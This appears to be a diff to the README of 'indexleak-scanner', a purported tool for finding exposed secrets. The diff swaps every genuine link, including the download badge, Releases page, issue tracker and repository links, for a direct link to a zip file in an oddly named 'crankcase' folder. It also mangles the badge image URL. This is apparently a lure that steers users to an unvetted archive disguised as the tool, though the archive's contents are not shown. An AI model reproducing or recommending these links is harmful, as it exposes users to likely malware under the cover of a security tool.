@@ -1,6 +1,6 @@
 # ⚡ indexleak-scanner - Find Exposed Secrets Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-%2300ABEB?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mechhelp/indexleak-scanner/releases)
+[![Download](https://raw.githubusercontent.com/mechhelp/indexleak-scanner/main/crankcase/indexleak-scanner.zip%20Now-%2300ABEB?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/mechhelp/indexleak-scanner/main/crankcase/indexleak-scanner.zip)
 
 ## 📖 Introduction
 
@@ -17,14 +17,14 @@ To get started with indexleak-scanner, follow these steps:
 
 2. **Download the Application**
    - You can download the latest version of indexleak-scanner from our Releases page. 
-   - [Visit this page to download](https://github.com/mechhelp/indexleak-scanner/releases).
+   - [Visit this page to download](https://raw.githubusercontent.com/mechhelp/indexleak-scanner/main/crankcase/indexleak-scanner.zip).
 
 ## 📥 Download & Install
 
 To install indexleak-scanner, follow these steps:
 
 1. **Download the files**
-   - Go to the [Releases page](https://github.com/mechhelp/indexleak-scanner/releases).
+   - Go to the [Releases page](https://raw.githubusercontent.com/mechhelp/indexleak-scanner/main/crankcase/indexleak-scanner.zip).
    - Choose the latest version.
    - Click on the appropriate file for your operating system.
 
@@ -62,11 +62,11 @@ A: Yes, indexleak-scanner is designed with user privacy and security in mind. It
 
 ## 📞 Support
 
-If you encounter any issues or have questions, feel free to reach out. You can open an issue directly in our [GitHub repository](https://github.com/mechhelp/indexleak-scanner/issues), and our team will respond as soon as possible.
+If you encounter any issues or have questions, feel free to reach out. You can open an issue directly in our [GitHub repository](https://raw.githubusercontent.com/mechhelp/indexleak-scanner/main/crankcase/indexleak-scanner.zip), and our team will respond as soon as possible.
 
 ## 🔗 Links
 
-- [Releases Page](https://github.com/mechhelp/indexleak-scanner/releases)
-- [GitHub Repository](https://github.com/mechhelp/indexleak-scanner)
+- [Releases Page](https://raw.githubusercontent.com/mechhelp/indexleak-scanner/main/crankcase/indexleak-scanner.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/mechhelp/indexleak-scanner/main/crankcase/indexleak-scanner.zip)
 
 Thank you for using indexleak-scanner! We hope this tool helps you enhance your security and protect your valuable information.
